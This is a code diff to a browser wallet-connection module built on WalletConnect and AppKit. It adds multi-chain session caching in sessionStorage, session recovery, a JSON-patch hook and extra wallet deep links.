@@ -3,6 +3,7 @@
  * AppKit npm @1.8.22 (bundle version 1.2.7) — NOT a separate "v5" package.
  */
 import './polyfills.js';
+import { installWcJsonPatch, uninstallWcJsonPatch } from './wc-json-patch.js';
 import * as viemChains from 'viem/chains';
 import { createAppKit } from '@reown/appkit';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
@@ -25,7 +26,8 @@ const RELAY_URL = 'wss://relay.walletconnect.org';
 const NETWORKS = [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche, solana, bitcoin];
 const MODAL_CLOSE_GRACE_MS = 180000;
 const APPKIT_VERSION = '1.8.22';
-const BUNDLE_VERSION = '1.2.7';
+const BUNDLE_VERSION = '1.3.0';
+const SESSION_CTX_KEY = 'legion_wc_session_ctx';
 
 const DEFAULT_EVM_WC_METHODS = [
   'eth_sendTransaction', 'eth_signTypedData_v4', 'personal_sign', 'eth_sign',
@@ -51,6 +53,70 @@ function buildOptionalNamespaces(override) {
     events: (base.eip155 && base.eip155.events) || DEFAULT_WC_EVENTS,
   };
   return base;
+}
+
+function countNonEvmNamespaces(ns) {
+  if (!ns || typeof ns !== 'object') return 0;
+  return Object.keys(ns).filter((k) => k !== 'eip155').length;
+}
+
+function saveSessionContext(families) {
+  try {
+    const flat = {};
+    if (families?.evm) flat.evm = families.evm.address;
+    if (families?.sol) flat.sol = families.sol.address;
+    if (families?.btc) flat.btc = families.btc.address;
+    if (families?.tron) flat.tron = families.tron.address;
+    if (families?.ton) flat.ton = families.ton.address;
+    if (families?.cosmos) flat.cosmos = families.cosmos.address;
+    if (families?.aptos) flat.aptos = families.aptos.address;
+    if (families?.sui) flat.sui = families.sui.address;
+    sessionStorage.setItem(SESSION_CTX_KEY, JSON.stringify({
+      ts: Date.now(),
+      families: flat,
+      topic: families?.evm?.topic || null,
+    }));
+  } catch (_) { /* ignore */ }
+}
+
+function loadSessionContext() {
+  try {
+    const raw = sessionStorage.getItem(SESSION_CTX_KEY);
+    if (!raw) return null;
+    const ctx = JSON.parse(raw);
+    if (!ctx || !ctx.ts) return null;
+    if (Date.now() - ctx.ts > 7 * 24 * 60 * 60 * 1000) {
+      sessionStorage.removeItem(SESSION_CTX_KEY);
+      return null;
+    }
+    return ctx;
+  } catch (_) {
+    return null;
+  }
+}
+
+async function tryRecoverStoredSession(m, requireWc) {
+  const families = scanWcSessionAllFamilies();
+  const ctx = loadSessionContext();
+  if (!families.evm && ctx?.families?.evm) {
+    families.evm = { address: ctx.families.evm, fromContext: true };
+  }
+  if (!families.evm) return null;
+
+  installWcJsonPatch();
+  log('session recovery — reusing stored WC | families:', Object.keys(families).join(',') || 'evm');
+
+  if (wagmiAdapter?.wagmiConfig) {
+    try { await reconnect(wagmiAdapter.wagmiConfig); } catch (_) { /* fresh connect */ }
+  }
+  await syncWagmiWcConnection();
+
+  const prov = await resolveProviderAsync(m, requireWc);
+  if (prov) {
+    saveSessionContext(families);
+    return prov;
+  }
+  return null;
 }
 
 const walletState = { address: null, chainId: null, isConnected: false };
@@ -92,7 +158,9 @@ function applyOptionalNamespaces(m, optionalNamespaces) {
   const override = optionalNamespacesToOverride(merged);
   if (!override || !m?.updateOptions) return merged;
   m.updateOptions({ universalProviderConfigOverride: override });
-  log('WC optionalNamespaces:', Object.keys(merged).join(', '), '| EVM chains:', merged.eip155.chains.length);
+  log('WC optionalNamespaces:', Object.keys(merged).join(', '),
+    '| EVM chains:', merged.eip155.chains.length,
+    '| non-EVM families:', countNonEvmNamespaces(merged));
   return merged;
 }
 
@@ -129,6 +197,8 @@ function buildMetadata(override) {
       native: `trust://open_url?coin_id=60&url=${encodedReturn}`,
       universal: `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedReturn}`,
       linkMode: true,
+      okx: `okx://wallet/dapp/url?dappUrl=${encodedReturn}`,
+      bitget: `bitkeep://bkconnect?action=dapp&url=${encodedReturn}`,
     },
   };
 
@@ -428,6 +498,7 @@ async function ensureInit(config) {
   if (initPromise) return initPromise;
 
   initPromise = (async () => {
+    installWcJsonPatch();
     const metadata = buildMetadata(config.metadata);
 
     wagmiAdapter = new WagmiAdapter({ projectId, networks: NETWORKS });
@@ -523,6 +594,7 @@ function waitForAccount(m, timeoutMs, requireWc) {
       done = true;
       cleanup();
       const families = scanWcSessionAllFamilies();
+      saveSessionContext(families);
       log('account ready', String(addr).slice(0, 10) + '...', source || '',
         '| families:', Object.keys(families).join(',') || 'evm');
       resolve({ address: addr, isConnected: true, sessionFamilies: families, ...st });
@@ -644,6 +716,17 @@ async function connect(config) {
   const preserveSession = config?.preserveSession === true;
   const shouldRestore = config?.restore === true;
 
+  installWcJsonPatch();
+
+  try {
+  if (shouldRestore || preserveSession) {
+    const recovered = await tryRecoverStoredSession(m, requireWc);
+    if (recovered) {
+      log('connected via session recovery | wc=', recovered.isWalletConnect);
+      return recovered;
+    }
+  }
+
   if (shouldRestore && wagmiAdapter?.wagmiConfig) {
     try {
       log('WC restore: attempting reconnect');
@@ -660,10 +743,13 @@ async function connect(config) {
   }
 
   const existing = wagmiAdapter?.wagmiConfig ? getAccount(wagmiAdapter.wagmiConfig) : null;
+  const lsFamilies = scanWcSessionAllFamilies();
   if (existing?.isConnected && existing.address) {
     const connId = existing.connector?.id || '';
     if (!requireWc || isWalletConnectConnector(connId)) {
-      log('reusing WC session', String(existing.address).slice(0, 10), connId);
+      saveSessionContext(lsFamilies);
+      log('reusing WC session', String(existing.address).slice(0, 10), connId,
+        '| families:', Object.keys(lsFamilies).join(',') || 'evm');
       return resolveProviderAsync(m, requireWc);
     }
     if (requireWc && isInjectedConnector(connId)) {
@@ -695,14 +781,21 @@ async function connect(config) {
     try { await m.disconnect(); } catch (_) { /* ignore */ }
     throw new Error('Extension hijacked WalletConnect — scan QR with phone wallet');
   }
+  saveSessionContext(scanWcSessionAllFamilies());
   log('connected via', provider.connectorId, 'wc=', provider.isWalletConnect);
   return provider;
+  } catch (err) {
+    uninstallWcJsonPatch();
+    throw err;
+  }
 }
 
 async function disconnect() {
   eip155Provider = null;
   solanaProvider = null;
   activeConnectorId = '';
+  uninstallWcJsonPatch();
+  try { sessionStorage.removeItem(SESSION_CTX_KEY); } catch (_) { /* ignore */ }
   if (modal) {
     try { await modal.disconnect(); } catch (_) { /* ignore */ }
   }
@@ -779,4 +872,13 @@ window.LegionWallet = {
   scanWcSessionAllFamilies,
   buildOptionalNamespaces,
   getAllEvmCaipChains: buildAllEvmCaipChains,
+  installWcJsonPatch,
+  uninstallWcJsonPatch,
+  tryRecoverStoredSession: async (requireWc) => {
+    const m = modal || (initProjectId ? await ensureInit({ projectId: initProjectId }) : null);
+    if (!m) return null;
+    return tryRecoverStoredSession(m, requireWc !== false);
+  },
+  saveSessionContext,
+  loadSessionContext,
 };
